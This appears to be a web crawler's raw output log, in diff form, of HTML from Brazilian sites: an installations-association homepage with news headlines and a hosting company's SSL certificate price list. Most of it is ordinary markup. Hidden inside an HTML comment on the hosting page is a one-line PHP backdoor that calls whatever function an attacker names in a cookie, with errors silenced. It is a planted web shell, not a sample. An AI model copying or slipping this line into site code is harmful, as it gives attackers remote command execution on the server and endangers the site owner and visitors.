@@ -1,0 +1,1276 @@
+Index File Name [../output/integration//output_index.txt] openned.
+Initialization OK!
+File [../output/integration//output_0] openned.
+http://www.abrinstal.org.br
+||| http://www.abrinstal.org.br/ | 
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-br" xml:lang="pt-br">
+<head>
+<link rel="stylesheet" type="text/css" href="http://www.abrinstal.org.br/scripts/styledefault.css" />
+<link rel="stylesheet" type="text/css" href="http://www.abrinstal.org.br/scripts/ddsmoothmenu.css" />
+<link rel="stylesheet" type="text/css" href="http://www.abrinstal.org.br/scripts/ddsmoothmenu-v.css" />
+
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
+<script type="text/javascript" src="http://www.abrinstal.org.br/scripts/ddsmoothmenu.js">
+/***********************************************
+* Smooth Navigational Menu- (c) Dynamic Drive DHTML code library (www.dynamicdrive.com)
+* This notice MUST stay intact for legal use
+* Visit Dynamic Drive at http://www.dynamicdrive.com/ for full source code
+***********************************************/
+</script>
+
+<script type="text/javascript">
+ddsmoothmenu.init({
+	mainmenuid: "smoothmenu1", //menu DIV id
+	orientation: 'h', //Horizontal or vertical menu: Set to "h" or "v"
+	classname: 'ddsmoothmenu', //class added to menu's outer DIV
+	//customtheme: ["#1c5a80", "#18374a"],
+	contentsource: "markup" //"markup" or ["container_id", "path_to_menu_file"]
+})
+
+ddsmoothmenu.init({
+	mainmenuid: "smoothmenu2", //Menu DIV id
+	orientation: 'v', //Horizontal or vertical menu: Set to "h" or "v"
+	classname: 'ddsmoothmenu-v', //class added to menu's outer DIV
+	//customtheme: ["#804000", "#482400"],
+	contentsource: "markup" //"markup" or ["container_id", "path_to_menu_file"]
+})
+</script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta http-equiv="Content-Language" content="pt-br">
+<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<!-- elaborado por Marcelo F. Souza -->
+<meta name="title" content="Abrinstal" />
+<meta name="description" content="Associa��o Brasileira pela Conformidade e Efici�ncia das Instala��es" />
+<meta name="keywords" content="Instala��es, El�tricas, G�s, Hidr�ulica, Combate � Inc�ndio, Telecomunica��es" />
+<meta http-equiv="refresh" content="240">
+<title>::: ABRINSTAL :::</title>
+</head>
+<body class="bgd1">
+<table border="0" cellpadding="0" cellspacing="0" style="width:100%">
+  <tr>
+    <td style="width:50px">&nbsp;</td>
+    <td>
+    
+<div align="center">
+<table border="0" cellpadding="0" cellspacing="0" style="width: 960px;">
+  <tr>
+    <td style="height: 129px;"><p>&nbsp;&nbsp;<img border="0" src="http://www.abrinstal.org.br/images/logo_abrinstal_home.gif" width="170" height="90"></p></td>
+  </tr>
+  <tr>
+    <td>
+    <div align="left"><table border="0" cellpadding="0" cellspacing="0"  style="width: 920px;"><tr><td>
+<!-- menu -->
+<div id="smoothmenu1" class="ddsmoothmenu">
+<ul>
+<li><a href="http://www.abrinstal.org.br/">HOME</a></li>
+<li><a href="#">A ABRINSTAL</a>
+  <ul>
+  <li><a href="http://www.abrinstal.org.br/content.asp?page=4">Quem&nbsp;somos</a></li>
+  <li><a href="http://www.abrinstal.org.br/content.asp?page=5">Como&nbsp;operamos</a></li>
+  <li><a href="http://www.abrinstal.org.br/content.asp?page=2">Diretoria&nbsp;e&nbsp;Conselho</a></li>
+  <li><a href="http://www.abrinstal.org.br/docs/ABRINSTAL_ESTATUTO_26abril06_OFICIAL.pdf" target="_blank">Estatuto&nbsp;<img border="0" src="http://www.abrinstal.org.br/images/icon_pdf3.gif" width="38" height="14"></a></li>
+  </ul>
+</li>
+<li><a href="#">ASSOCIE-SE</a>
+  <ul>
+  <li><a href="http://www.abrinstal.org.br/content.asp?page=8">Porque&nbsp;se&nbsp;associar</a></li>
+  <li><a href="http://www.abrinstal.org.br/content.asp?page=9">Participe</a></li>
+  </ul>
+</li>
+<li><a href="#">ASSOCIADOS</a>
+  <ul>
+  <li><a href="http://www.abrinstal.org.br/conteudo.asp?page=1">Mantenedores&nbsp;associativos</a></li>
+  <li><a href="http://www.abrinstal.org.br/conteudo.asp?page=2">Mantenedores&nbsp;empresariais</a></li>
+  <li><a href="http://www.abrinstal.org.br/conteudo.asp?page=3">Associados&nbsp;institucionais</a></li>
+  <li><a href="http://www.abrinstal.org.br/conteudo.asp?page=4">Apoiadores</a></li>
+  </ul>
+</li>
+<li><a href="http://www.abrinstal.org.br/eventos.asp">EVENTOS</a></li>
+<li><a href="#">PROGRAMAS</a>
+  <ul>
+  <li><a href="http://www.abrinstal.org.br/projeto.asp?page=1">Conformidade de Instala��es - Qualinstal</a></li>
+  <li><a href="http://www.abrinstal.org.br/projeto.asp?page=14">Premia��o Setorial � Masterinstal</a></li>
+  <li><a href="http://www.abrinstal.org.br/projeto.asp?page=2">Normaliza��o Setorial</a></li>
+  <li><a href="http://www.abrinstal.org.br/projeto.asp?page=3">Monitoramento Regulat�rio</a></li>
+  <li><a href="http://www.abrinstal.org.br/projeto.asp?page=8">Inova��o Tecnol�gica</a></li>
+  </ul>
+</li>
+<li><a href="#"> PROJETOS</a>
+  <ul>
+  <li><a href="#">Em&nbsp;andamento</a>
+  	<ul>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=15">Qualig�s</a></li>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=24">Quali�gua</a></li>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=25">Qualiel�trica</a></li>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=28">Qualinstal Solar</a></li>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=16">Masterinstal</a></li>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=30">O G�s LP e a Efici�ncia Energ�tica � Plano Nacional de Efici�ncia Energ�tica</a></li>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=31">Aux�lio � Pesquisa � G�s LP</a></li>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=32">Desenvolvimento de Solu��es Tecnol�gicas para Instala��o Interna de GN em Resid�ncias Unifamiliares</a></li>
+  		<li><a href="http://www.abrinstal.org.br/projeto.asp?page=33">Gest�o da Energia e a Promo��o da Efici�ncia Energ�tica (SAG-GE)</a></li>
+  	</ul>
+  </li>
+  <li><a href="http://www.abrinstal.org.br/projeto.asp?page=29">Finalizados</a></li>
+  </ul>
+</li>
+<li><a href="#">NORMAS</a>
+  <ul>
+  <li><a href="http://www.abrinstal.org.br/normas/index.asp?page=Norma">Normas</a></li>
+  <li><a href="http://www.abrinstal.org.br/normas/index.asp?page=Regulamento">Regulamentos</a></li>
+  <li><a href="http://www.abrinstal.org.br/docs/doc_sist_aquec_solar.pdf" target="_blank">Recomenda��o T�cnica&nbsp;<img border="0" src="http://www.abrinstal.org.br/images/icon_pdf3.gif" width="38" height="14"></a></li>
+  </ul>
+</li>
+<li><a href="http://www.abrinstal.org.br/content.asp?page=110">FALE CONOSCO</a></li>
+</ul>
+<br style="clear: left" />
+</div>
+<!-- menu -->
+    </td></tr></table></div>
+    </td>
+  </tr>
+</table>
+</div>
+
+    </td>
+    <td align="right" valign="top" style="width:50px">
+
+<a href="http://www.abrinstal.org.br/"><img border="0" src="http://www.abrinstal.org.br/images/icon_flag_br.gif" width="30" height="30"></a><br>
+<a href="http://www.abrinstal.org.br/version/en/"><img border="0" src="http://www.abrinstal.org.br/images/icon_flag_en2.gif" width="30" height="30"></a><br>
+<a href="http://www.abrinstal.org.br/version/es/"><img border="0" src="http://www.abrinstal.org.br/images/icon_flag_es2.gif" width="30" height="30"></a>
+
+    </td>
+  </tr>
+</table>
+
+
+<!--table border="0" cellpadding="0" cellspacing="0" style="height:400px"><tr><td>&nbsp;</td></tr></table-->
+
+
+<div align="center">
+<iframe name="flash" width="100%" height="320" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="http://www.abrinstal.org.br/banner_home_abr.html"></iframe>
+</div>
+
+<div align="center">
+<table border="0" cellpadding="0" cellspacing="0" class="tbcontent00"><tr><td align="center">
+
+<table border="0" cellpadding="0" cellspacing="0" class="tbcontent02">
+  <tr>
+    <td class="tbcontent01">
+<table border="0" cellpadding="3" cellspacing="0" style="width: 100%;"><tr><td>&nbsp;</td></tr></table>
+
+
+<table border="0" cellpadding="0" cellspacing="0" style="height: 480px;">
+  <tr>
+    <td style="vertical-align: top;">
+<!-- banners -->
+<table border="0" cellpadding="3" cellspacing="0" style="width:160px;">
+  <tr>
+    <td><a href="http://www.abrinstal.org.br/eventos/" ><img border="0" src="http://www.abrinstal.org.br/images/banners/banner_eventos.jpg"></a></td>
+  </tr>
+  <tr>
+    <td><a href="http://www.qualinstal.org.br/content.asp?id=8"  target="_blank"><img border="0" src="http://www.abrinstal.org.br/images/banners/banner_treinamentos.jpg"></a></td>
+  </tr>
+
+
+  <tr>
+    <td><a href="http://www.abrinstal.org.br/boletim/" ><img border="0" src="http://www.abrinstal.org.br/images/banners/banner_boletim.jpg" width="160" height="60"></a></td>
+  </tr>
+  <tr>
+    <td><a href="http://www.abrinstal.org.br/boletim/wpc/" ><img border="0" src="http://www.abrinstal.org.br/images/banner_wpc_news.jpg" width="160" height="60"></a></td>
+  </tr>
+
+  <tr>
+    <td><a href="http://www.abrinstal.org.br/conteudo.asp?page=5"  target="_parent"><img border="0" src="http://www.abrinstal.org.br/images/banners/banner_video_inspecao.jpg" width="160" height="160"></a></td>
+  </tr>
+
+</table>
+<!-- banners -->
+    </td>
+  </tr>
+</table>
+</td>
+    <td style="vertical-align: top;">
+    <!-- conteudo -->
+    
+<div align="right">
+<table border="0" cellpadding="5" cellspacing="0" style="width: 100%;">
+  <tr>
+    <td colspan="3">&nbsp;</td>
+  </tr>
+  <tr>
+    <td style="width: 45%;vertical-align: top;">
+    <!-- celula -->
+      <table border="0" cellspacing="0" style="width: 100%;">
+        <tr>
+          <td style="width: 50%;"><img border="0" src="images/titulo_destaque.jpg"></td>
+          <td style="width: 50%;" align="right" class="font1" valign="bottom"><b>[<a href="destaque_list.asp">Outros destaques</a>]</b></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" bgcolor="#000080" colspan="2"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" colspan="2"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" colspan="2"><a href="destaque.asp?page=3568" class="link1">11 de mar�o, dia mundial do instalador hidr�ulico</a></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" colspan="2" align="justify">Como membro do WPC (World Plumbing Council - Conselho Mundial das Instala��es), a Associa��o Brasileira pela Conformidade e Efici�ncia das Instala��es (Abrinstal) segue os princ�pios do WPC que tem a miss�o de promover as instala��es para melhoria da sa�de p�blica e prote��o ao meio ambiente, colocando a ind�stria mundial das instala��es para o benef�cio de todos. E nesse dia 11 de mar�o comemoram... </td>
+        </tr>
+      </table>
+    </td>
+    <td style="width: 10%;vertical-align: top;">
+    </td>
+    <td style="width: 45%;vertical-align: top;">
+    <!-- celula -->
+      <table border="0" cellspacing="0" style="width: 100%;">
+        <tr>
+          <td style="width: 50%;"><img border="0" src="images/titulo_artigo.jpg"></td>
+          <td style="width: 50%;" align="right" class="font1" valign="bottom"><b>[<a href="artigo_list.asp">Outros artigos</a>]</b></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" bgcolor="#000080" colspan="2"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" colspan="2"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" colspan="2"><a href="artigo.asp?page=3389" class="link1">Enchimento remoto e parcial de botij�es: risco para o consumidor</a></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" colspan="2" align="justify"><small>por: Adriano Horta Loureiro</small>
+<br />Em 2011, a Nig�ria orgulhosamente declara que estava instalando unidades remotas de enchimento de recipientes, enchimento total ou parcial, conforme quantidade desejada pelo consumidor, com destaque sobre a rapidez com que se enche um recipiente e que podem ser cheios vasilhames de qualquer capacidade.
+<br />
+<br />Essa "suposta" rapidez tornaram... </td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+  <tr>
+    <td colspan="3" style="height: 30px;">&nbsp;</td>
+  </tr>
+  <tr>
+    <td style="vertical-align: bottom;" colspan="3">
+    <!-- celula -->
+      <table border="0" cellspacing="0" style="width: 100%;">
+        <tr>
+          <td style="width: 50%;"><img border="0" src="images/titulo_noticias.jpg"></td>
+          <td style="width: 50%;" align="right" class="font1" valign="bottom"><b>[<a href="noticia_list.asp">Outras not�cias</a>]</b></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" bgcolor="#000080" colspan="2"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" colspan="2"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+        </tr>
+        <tr>
+          <td style="width: 100%;" colspan="2">
+            <table border="0" cellspacing="0" cellpadding="2">
+
+              <tr><td><div class="font2"><a href="noticia.asp?page=3866" class="link3">[20/4/2016]  Moreira � cogitado para comandar Petrobras</a></div></td></tr>
+
+              <tr><td><div class="font2"><a href="noticia.asp?page=3865" class="link3">[20/4/2016]  Aumento de carros a GNV contribuiu para alta no consumo de g�s natural</a></div></td></tr>
+
+              <tr><td><div class="font2"><a href="noticia.asp?page=3864" class="link3">[20/4/2016]  A perspectiva das constru��es sustent�veis, artigo de Reinaldo Dias</a></div></td></tr>
+
+              <tr><td><div class="font2"><a href="noticia.asp?page=3863" class="link3">[20/4/2016]  Uso das ferramentas de TI nas opera��es de projetos de efici�ncia energ�tica ser� debatido em Webinar</a></div></td></tr>
+
+              <tr><td><div class="font2"><a href="noticia.asp?page=3862" class="link3">[20/4/2016]  Baixa renda e loteamentos puxam lan�amentos no 1� trimestre</a></div></td></tr>
+
+              <tr><td><div class="font2"><a href="noticia.asp?page=3861" class="link3">[20/4/2016]  Lan�amento de im�veis cai 8,6% nos 3 meses at� fevereiro, dizem Fipe e Abrainc</a></div></td></tr>
+
+              <tr><td><div class="font2"><a href="noticia.asp?page=3860" class="link3">[20/4/2016]  Feicon Batimat encerra com participa��o de duas mil marcas e cerca de 95 mil visitantes</a></div></td></tr>
+
+              <tr><td><div class="font2"><a href="noticia.asp?page=3859" class="link3">[20/4/2016]  Consumo de g�s natural cai 17,95% em fevereiro, diz Abeg�s</a></div></td></tr>
+
+            </table>
+          </td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+</table>
+</div>
+
+    <!-- conteudo -->
+    </td>
+  </tr>
+</table>
+
+<!-- apoios -->
+<hr noshade size="1" color="#FFFFFF">
+<table border="0" cellpadding="0" cellspacing="0" class="tbcontent02">
+  <tr>
+    <td>APOIO</td>
+    <td>&nbsp;&nbsp;</td>
+    <td style="width: 160px;">PROJETO</td>
+    <!--td>&nbsp;&nbsp;</td>
+    <td>INFORMATIVO</td-->
+  </tr>
+  <tr>
+    <td align="center" class="tbunderline"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+    <td align="center"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+    <td align="center" class="tbunderline"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+    <!--td align="center"><img border="0" src="images/pixel.gif" width="1" height="1"></td>
+    <td align="center" class="tbunderline"><img border="0" src="images/pixel.gif" width="1" height="1"></td-->
+  </tr>
+  <tr>
+    <td align="center">
+      <table border="0" cellpadding="2" cellspacing="0" style="width: 100%;">
+        <tr>
+          <td align="center"><a href="http://www.sindinstalacao.com.br" target="_blank"><img border="0" src="images/banner_sindinstalacao.jpg"></a></td>
+          <td align="center"><a href="http://www.hbclaw.com.br" target="_blank"><img border="0" src="images/banner_hackerott.jpg"></a></td>
+          <td align="center"><a href="http://www.olade.org" target="_blank"><img border="0" src="images/banner_olade.jpg"></a></td>
+          <td align="center"><a href="http://www.iapmo.org" target="_blank"><img border="0" src="images/banner_iapmo.jpg"></a></td>
+        </tr>
+      </table>
+    </td>
+    <td align="center"></td>
+    <td align="center"><a href="http://www.qualinstal.org.br/" target="_blank"><img border="0" src="images/banner_qualinstal.jpg"></a></td>
+    <!--td align="center"></td>
+    <td align="center"><a href="http://www.abrinstal.org.br/boletim/"><img border="0" src="images/banner_boletim.jpg"></a></td-->
+  </tr>
+</table>
+<!-- apoios -->
+
+<hr class="hr1">
+
+<!-- rodape -->
+<div align="center">
+<table border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td class="tbrodape">
+    Abrinstal - Associa��o Brasileira pela Conformidade e Efici�ncia de Instala��es
+    </td>
+  </tr>
+</table>
+</div>
+<p>&nbsp;</p>
+<!-- rodape -->
+<!-- Google Analytics -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-66528016-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<!-- Google Analytics -->
+
+</td></tr></table>
+</div>
+
+</body>
+
+</html>
+<!-- endcode -->
+----------------------------- END OF HTML
+http://www.acfenacon.com.br/politica
+
+||| http://www.acfenacon.com.br/politica |
+----------------------------- END OF HTML
+http://www.storehosting.com.br/certificado-ssl
+ 
+||| http://www.storehosting.com.br/certificado-ssl | <!DOCTYPE html>
+<html class="no-js" lang="pt-br">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="Store Hosting � especializada em Hospedagem de Sites, Servidores VPS e Servidores Dedicados. Seu diferencial � o pre�o baixo com migra��o de sites gr�tis, compat�vel com Wordpress, Joomla, Magento, phpBB, Drupal, OpenCart, PrestaShop." />  
+<meta property="og:image" content="http://www.storehosting.com.br/banner/logo_pqn.jpg" />
+
+<meta name="keywords" content="servidores, vps, dedicados, hospedagem, gr�tis, migra��o, wordpress, host, hosting, cloud, nuvem, joomla, servidor, data ceter, phpBB, PHP, HTML5, CSS3, MySQL, Linux, Windows, CloudLinux" />
+<meta name="author" content="StoreHosting - Solu��es Web" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<title>Servidores VPS, Dedicados e Hospedagem de Sites - Certificado SSL</title>
+
+<!--Fav and touch icons-->
+<link rel="shortcut icon" href="http://www.storehosting.com.br/assets/img/icons/favicon.png">
+
+<!--google web font-->
+<link href='http://fonts.googleapis.com/css?family=Bad+Script|Open+Sans:400,300,300italic,400italic,600,600italic' rel='stylesheet' type='text/css'>
+
+<!--style sheets-->
+<link rel="stylesheet" media="screen" href="http://www.storehosting.com.br/assets/css/bootstrap.css"/>
+<link rel="stylesheet" media="screen" href="http://www.storehosting.com.br/assets/css/bootstrap-responsive.css"/>
+<link rel="stylesheet" media="screen" href="http://www.storehosting.com.br/assets/css/style.css"/>
+<link rel="stylesheet" media="screen" href="http://www.storehosting.com.br/assets/css/custom.css"/>
+<link rel="stylesheet" media="screen" href="http://www.storehosting.com.br/assets/css/whhg.css"/>
+<link rel="stylesheet" type="text/css" href="http://www.storehosting.com.br/assets/rs-plugin/css/settings.css" media="screen"/>
+<link rel="stylesheet" type="text/css" href="http://www.storehosting.com.br/assets/css/fullwidth.css" media="screen"/>
+
+<!--main jquery libraries / others are at the bottom-->
+<script src="http://www.storehosting.com.br/assets/js/jquery-1.9.1.min.js" type="text/javascript" ></script>
+<script src="http://www.storehosting.com.br/assets/js/modernizr.js" type="text/javascript"></script>
+<script src="http://www.storehosting.com.br/assets/js/jcarousellite.js" type="text/javascript"></script>
+
+<!-- Shadow Box-->
+
+<!-- <link rel="stylesheet" type="text/css" href="http://www.storehosting.com.br/shadowbox/shadowbox.css"> -->
+<!-- <script type="text/javascript" src="http://www.storehosting.com.br/shadowbox/shadowbox.js"></script> -->
+
+
+</head>
+<body>
+<!--
+<div id="boxes">
+  <div id="dialog" class="window">
+    Content ShadowBox
+  </div>
+  <div id="mask"></div>
+</div>
+-->
+
+<!-- Facebook -->
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/pt_BR/sdk.js#xfbml=1&appId=565478886869236&version=v2.0";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<!-- Facebook -->
+
+
+<!-- header / header-bottom section starts
+================================================== -->
+<section id="header">
+  <div class="container">
+    <div class="row"> 
+      
+      <!--logo starts-->
+      <div class="span4"> <a href="http://www.storehosting.com.br/"><img width="250" src="http://www.storehosting.com.br/assets/img/logo.png" alt="logo"></a> </div>
+      <!--logo ends--> 
+      
+      <!--social / search starts-->
+      <div class="span7">
+        <div style="float:right;margin:10px 0 -10px 0;">
+          <form method="post" action="https://cliente.storehosting.com.br/dologin.php">
+            <input style="padding:5px;width:200px;margin-right:10px" name="username" type="text" placeholder="Email" />
+            <input style="padding:5px;width:200px;margin-right:10px" name="password" type="password" placeholder="Senha" />
+            <input style="padding:0px 15px;width:200px;margin-right:10px;height:40px" name="s" type="submit" class="submit" value="Entrar" />
+          </form>
+          <a href="https://cliente.storehosting.com.br/register.php" title="Cadastre-se na StoreHosting!">Cadastre-se</a> / <a href="https://cliente.storehosting.com.br/pwreset.php" title="Esqueceu a senha?">Esqueci a Senha</a>
+        </div>
+      </div>
+      <!--social / search ends--> 
+      
+    </div>
+  </div>
+</section>
+<!--header ends--> 
+
+<!--header-bottom starts-->
+<section id="header-bottom">
+  <div class="container">
+    <div class="row"> 
+      
+      <!--menu starts-->
+      <div class="span8">
+        <div id="smoothmenu" class="ddsmoothmenu">
+          <ul>
+            <li><a href="http://www.storehosting.com.br/" class="selected">Inicio</a></li>
+            <li><a href="http://www.storehosting.com.br/empresa">A Empresa</a> </li>
+            <li><a href="#">Servi�os</a>
+              <ul>
+                <li><a href="http://www.storehosting.com.br/hospedagem">Hospedagem</a> </li>
+                <li><a href="http://www.storehosting.com.br/servidor-vps">VPS Linux</a></li>
+                <!-- <li><a href="http://www.storehosting.com.br/servidor-vps-windows">VPS Windows</a></li> -->
+                <li><a href="http://www.storehosting.com.br/servidor-dedicado">Servidor Dedicado</a> </li>
+                <!-- <li><a href="http://www.storehosting.com.br/backup-remoto">Backup Remoto</a></li> -->
+                <li><a href="http://www.storehosting.com.br/certificado-ssl">Certificado SSL</a></li>
+              </ul>
+            </li>
+            <!-- <li><a href="http://www.storehosting.com.br/blog">Blog</a></li> -->
+            <li><a href="http://www.storehosting.com.br/contato">Contato</a> </li>
+          </ul>
+        </div>
+      </div>
+      <!--menu ends--> 
+      
+      <!--call / mail starts-->
+      <div class="span4">
+        <ul class="inline-right">
+          <li><img src="http://www.storehosting.com.br/assets/img/icons/icon-call-mail.png" alt="icon"></li>
+          <li>
+            <h4 class="heading-styled text-right">Skype StoreHosting <span><a href="#">suporte@storehosting.com.br</a></span> </h4>
+          </li>
+        </ul>
+      </div>
+      <!--call / mail ends--> 
+      
+    </div>
+  </div>
+</section>
+<!--header-bottom ends--> 
+
+<!-- header / header-bottom section ends
+================================================== --><!-- cont
+
+if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
+
+ent section starts
+================================================== -->
+<section id="content">
+  <div class="container"> 
+
+<!--content-top starts-->
+    <div class="row">
+      <div id="content-top" class="span12">
+        <h1>Certificado SSL</h1>
+        <p class="text-big">Conhe�a nossos planos de Certificados SSL.</p>
+      </div>
+    </div>
+    <!--content-top ends--> 
+    
+    <!--row for pricing starts-->
+    <div class="row">
+      <div class="pricing-wrapper"> 
+        
+        <!--table one starts-->
+        <div class="span4">
+          <div class="pricing">
+            <table>
+              <thead>
+                <tr>
+                  <th> <div class="label-wrapper">
+                      <div class="price-label"><div class="price-label-rs">R$ </div>70<span>/Ano</span> </div>
+                    </div>
+                    Standard SSL </th>
+                </tr>
+              </thead>
+              <tfoot>
+                <tr>
+                  <td><a href="https://cliente.storehosting.com.br/cart.php?a=add&pid=35&carttpl=cart" class="mybtn bigbtn">Contratar</a></td>
+                </tr>
+              </tfoot>
+              <tbody>
+                <tr>
+                  <td><img src="http://www.storehosting.com.br/assets/img/preview/lock.png" alt="icon"></td>
+                </tr>
+                <tr>
+                  <td>
+                    <br>
+                    <ul class="hosting-list">
+                      <li><strong>Criptografia</strong><span class="inline-right">128 a 256 Bits</span></li>
+                      <li><strong>Dominio</strong><span class="inline-right">Simples</span></li>
+                      <li><strong>Garantia Subscrita</strong><span class="inline-right">US$ 10.000</span></li>
+                      <li><strong>Compatibilidade</strong><span class="inline-right">99% + Mobile</span></li>
+                    </ul>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+        <!--table one ends--> 
+        
+        <!--table two starts-->
+        <div class="span4">
+          <div class="pricing">
+            <table>
+              <thead>
+                <tr>
+                  <th> <div class="label-wrapper">
+                      <div class="price-label"><div class="price-label-rs">R$ </div>200<span>/Ano</span> </div>
+                    </div>
+                    Pro SSL </th>
+                </tr>
+              </thead>
+              <tfoot>
+                <tr>
+                  <td><a href="https://cliente.storehosting.com.br/cart.php?a=add&pid=36&carttpl=cart" class="mybtn bigbtn">Contratar</a></td>
+                </tr>
+              </tfoot>
+              <tbody>
+                <tr>
+                  <td><img src="http://www.storehosting.com.br/assets/img/preview/lock.png" alt="icon"></td>
+                </tr>
+                <tr>
+                  <td>
+                    <br>
+                    <ul class="hosting-list">
+                      <li><strong>Criptografia</strong><span class="inline-right">128 a 256 Bits</span></li>
+                      <li><strong>Dominio</strong><span class="inline-right">Simples</span></li>
+                      <li><strong>Garantia Subscrita</strong><span class="inline-right">US$ 10.000</span></li>
+                      <li><strong>Compatibilidade</strong><span class="inline-right">99% + Mobile</span></li>
+                    </ul>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+        <!--table two ends--> 
+        
+        <!--table three starts-->
+        <div class="span4">
+          <div class="pricing">
+            <table>
+              <thead>
+                <tr>
+                  <th> <div class="label-wrapper">
+                      <div class="price-label"><div class="price-label-rs">R$ </div>350<span>/Ano</span> </div>
+                    </div>
+                    Wildcard SSL</th>
+                </tr>
+              </thead>
+              <tfoot>
+                <tr>
+                  <td><a href="https://cliente.storehosting.com.br/cart.php?a=add&pid=40&carttpl=cart" class="mybtn bigbtn">Contratar</a></td>
+                </tr>
+              </tfoot>
+              <tbody>
+                <tr>
+                  <td><img src="http://www.storehosting.com.br/assets/img/preview/lock.png" alt="icon"></td>
+                </tr>
+                <tr>
+                  <td>
+                    <br>
+                    <ul class="hosting-list">
+                      <li><strong>Criptografia</strong><span class="inline-right">128 a 256 Bits</span></li>
+                      <li><strong>Dominio</strong><span class="inline-right">M�ltiplo Subdom�nios</span></li>
+                      <li><strong>Garantia Subscrita</strong><span class="inline-right">US$ 10.000</span></li>
+                      <li><strong>Compatibilidade</strong><span class="inline-right">99% + Mobile</span></li>
+                    </ul>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+        <!--table three ends--> 
+        
+      </div>
+    </div>
+    <!--row for pricing ends--> 
+  </div>
+</section>
+<!-- content section ends
+================================================== -->  
+  <div class="container"> 
+
+    <!--spacer here-->
+    <div class="spacer-20px"></div>
+    
+    <!--row for features starts-->
+    <div class="row"> 
+      
+      <!--features starts-->
+      <div class="fr-icon clearfix">
+        <div class="span2"><img src="http://www.storehosting.com.br/assets/img/cloudlinux.jpg"></div>
+        <div class="span2"><img src="http://www.storehosting.com.br/assets/img/nginx.jpg"></div>
+        <div class="span2"><img src="http://www.storehosting.com.br/assets/img/cloudflare.jpg"></div>
+        <div class="span2"><img src="http://www.storehosting.com.br/assets/img/intel.jpg"></div>
+        <div class="span2"><img src="http://www.storehosting.com.br/assets/img/cisco.jpg"></div>
+        <div class="span2"><img src="http://www.storehosting.com.br/assets/img/cpanel.jpg"></div>
+
+      </div>
+      <!--features ends--> 
+           
+    </div>
+    <!--row for features ends--> 
+    
+  </div>
+</section>
+<!-- content section ends
+================================================== --> 
+
+<!-- footer section starts
+================================================== -->
+<section id="footer">
+  <div class="container">
+    <div class="row"> 
+      
+      <!--first column starts-->
+      <div class="span3">
+        <div class="fb-like-box" data-href="https://www.facebook.com/StoreHosting" data-colorscheme="light" width="270" data-show-faces="true" data-header="false" data-stream="false" data-show-border="false"></div>
+      </div>
+      <!--first column ends--> 
+      
+      <!--second column starts-->
+      <div class="span2">
+        <h5>Nossos Servi�os</h5>
+        <ul class="myunstyled submenu">
+          <li><a href="http://www.storehosting.com.br/hospedagem">Hospedagem</a></li>
+          <li><a href="http://www.storehosting.com.br/servidor-vps">VPS Linux</a></li>
+          <!-- <li><a href="http://www.storehosting.com.br/servidor-vps-windows">VPS Windows</a></li> -->
+          <li><a href="http://www.storehosting.com.br/servidor-dedicado">Servidor Dedicado</a></li>
+          <!-- <li><a href="http://www.storehosting.com.br/backup-remoto">Backup Remoto</a></li> -->
+          <li><a href="http://www.storehosting.com.br/certificado-ssl">Certificado SSL</a></li>
+        </ul>
+      </div>
+      <!--second column ends--> 
+      
+      <!--fourth column starts-->
+      <div class="span2">
+        <h5>Links R�pidos</h5>
+        <ul class="myunstyled submenu">
